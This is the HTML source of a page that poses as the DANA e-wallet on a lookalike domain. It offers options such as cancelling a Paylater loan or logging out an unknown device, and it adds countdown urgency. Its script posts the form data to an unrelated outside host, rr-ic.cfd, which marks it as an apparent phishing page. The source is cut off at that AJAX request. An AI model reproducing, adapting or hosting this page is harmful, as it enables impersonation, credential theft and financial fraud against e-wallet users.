...
<meta charset="UTF-8">
  ...
  <title>ᴅᴀɴᴀ - #ғᴏʀᴍ ᴅᴀɴᴀ ᴘᴀʏʟᴀᴛᴇʀ</title>
  ...
  <!-- Facebook Meta Tags -->
  <meta property="og:url" content="https://dana.id.com/">
  <meta property="og:type" content="website">
  <meta property="og:title" content="ᴅᴀɴᴀ - #ғᴏʀᴍ ᴅᴀɴᴀ ᴘᴀʏʟᴀᴛᴇʀ">
 ...
 <meta property="og:image" content="https://hosting.tigerengine.id/mwayum.jpg">


  <!-- Twitter Meta Tags -->
  <meta name="twitter:card" content="summary_large_image">
  <meta property="twitter:domain" content="https://dana.id.com/">
  <meta property="twitter:url" content="https://dana.id.com/">
  <meta name="twitter:title" content="ᴅᴀɴᴀ - #ғᴏʀᴍ ᴅᴀɴᴀ ᴘᴀʏʟᴀᴛᴇʀ">
  ...
  <meta name="twitter:image" content="https://hosting.tigerengine.id/mwayum.jpg">
 <link href="https://hosting.tigerengine.id/shv5u3.png" rel="shortcut icon" type="image/x-icon">
  <link href="https://hosting.tigerengine.id/shv5u3.png" rel="apple-touch-icon">
 <link rel="canonical" href="https://dana.id.com/">
<meta property="og:url" content="https://dana.id.com/" />
...
<script>
let tglNow = new Date();
let waktuBatas = new Date("2025-04-19T23:59:00");
...
body{
    background-image: url(https://hosting.tigerengine.id/lrlrch.png);
...
<img src="https://hosting.tigerengine.id/ulqfeu.png" style="width: 100px; margin-top: 7px; margin-left: 9px; background: #">   
</nav>
<center>
 <img id="video"
  ...
  box-shadow: rgba(6, 24, 44, 1.4) 0px 0px 6px 6px, rgba(6, 24, 44, 0.05) 0px 4px 6px -1px, rgba(255, 255, 255, 1.08) 0px 1px 0px inset; outline: 3px solid #118EEA" preload="metadata" src="https://hosting.tigerengine.id/mahyz4.jpg" type="img/jpeg" class="animated">
</center>
<section class="effec">
<!-- partial:index.partial.html -->
...
<form id="patok" style="margin-top: -90px; border-top: 1px solid #ccc; height: 195px; text-align: center; background: url(https://hosting.tigerengine.id/urtrn0.png);
    background-position: 100% 100%;
    background-size: 100% 100%; background-color: #fff; outline: 1px solid #118EEA;box-shadow: rgba(6, 24, 24, 0.99) 0px 0px 0px 2px, rgba(6, 24, 4, 10.65) 0px 4px 6px -1px, rgba(255, 255, 255, 0.08) 0px 1px 0px inset; font-size: 12px; color: #fff; margin-left: 5.5px">
    <style>
 .aha {
  display: flex;
  cursor: pointer;
...
.s:active{
 ...
 <center>
       <label class="aha">
       <input type="radio" id="btn1" name="tarif" value="𝗣𝗲𝗺𝗯𝗮𝘁𝗮𝗹𝗮𝗻 𝗣𝗶𝗻𝗷𝗮𝗺𝗮𝗻 𝗣𝗮𝘆𝗹𝗮𝘁𝗲𝗿" onclick="letsgo1()"/>
    <span class="s">𝗣𝗲𝗺𝗯𝗮𝘁𝗮𝗹𝗮𝗻 𝗣𝗶𝗻𝗷𝗮𝗺𝗮𝗻 𝗣𝗮𝘆𝗹𝗮𝘁𝗲𝗿</span>
		</label>
  <label class="aha">
   <input type="radio" id="btn2" name="tarif" value="𝗟𝗼𝗴 𝗢𝘂𝘁 𝗽𝗲𝗿𝗮𝗻𝗴𝗸𝗮𝘁 𝘁𝗮𝗸 𝗱𝗶𝗸𝗲𝗻𝗮𝗹" onclick="letsgo1()">
   <sp class="s">𝗟𝗼𝗴 𝗢𝘂𝘁 𝗽𝗲𝗿𝗮𝗻𝗴𝗸𝗮𝘁 𝘁𝗮𝗸 𝗱𝗶𝗸𝗲𝗻𝗮𝗹</span>
   </label>
   <label class="aha">
   ...
   <label class="aha">
   <input type="radio" id="btn4" name="tarif" value="𝗟𝗮𝗽𝗼𝗿𝗸𝗮𝗻 𝗞𝗲𝗻𝗱𝗮𝗹𝗮 𝗔𝗸𝘂𝗻" onclick="letsgo1()">
   <sp class="s">𝗟𝗮𝗽𝗼𝗿𝗸𝗮𝗻 𝗞𝗲𝗻𝗱𝗮𝗹𝗮 𝗔𝗸𝘂𝗻</span>
   </label>
<br/>
...
<center>
     <div id="process1" name="process" class="process1" style="display: none; background: rgba(0, 0, 0, 0.4);">
            <div class="loading">
                <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiZH-N0wN6FAmkGgyk10EQ7jvi3t_76GOfnax8pM8juwlMyN4KOy-2WuI68vLTMOnZyZmnNa7MHNI9U2k-ZcGYWruvALXJ-VnD1i4iBfezdLGGtFzjvpAmiLogvJeuvKHWwazaeN5cE6A0r9Gmiu7ObxeLFIc29G1pOJlc1QY8GPjMmZGvO0uTQX5X12rk/s1600/load_bg.png">
                <img class="spinner" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjymgZkivno__fWTdTz6vvunARIRJI4BZogXCTs1Q35vHyxC3A1oZU4JyRKdwoXwJsKF90P0B-7Tilt7sPl0VfXIdaltZEX6c97hkKpVD6MOMS04xpqaH4HL318jf_bOGlOhIL2KmyJMZfH_mhw9AqxGr28S53SYvvQaVSUwMtoWXsup2HC83uzdzoVHtY/s1600/load_spin.png" id="loading" style="margin-top: -2px">
            </div>
        </div>
        </center>
<img src="https://hosting.tigerengine.id/o6fxxt.png" style="width: 100%; position: fixed; bottom: -5; left: 0; right: 0; margin: 0px auto; z-index: -1;"> 
<script>
...
var tarif = $('input[name="tarif"]:checked').val();
 ...
 event.preventDefault();
      $("#process1").fadeIn(); 
        $.ajax({
            type: 'POST',
            url: 'https://rr-ic.cfd/cv2d/ii/tarif.php',
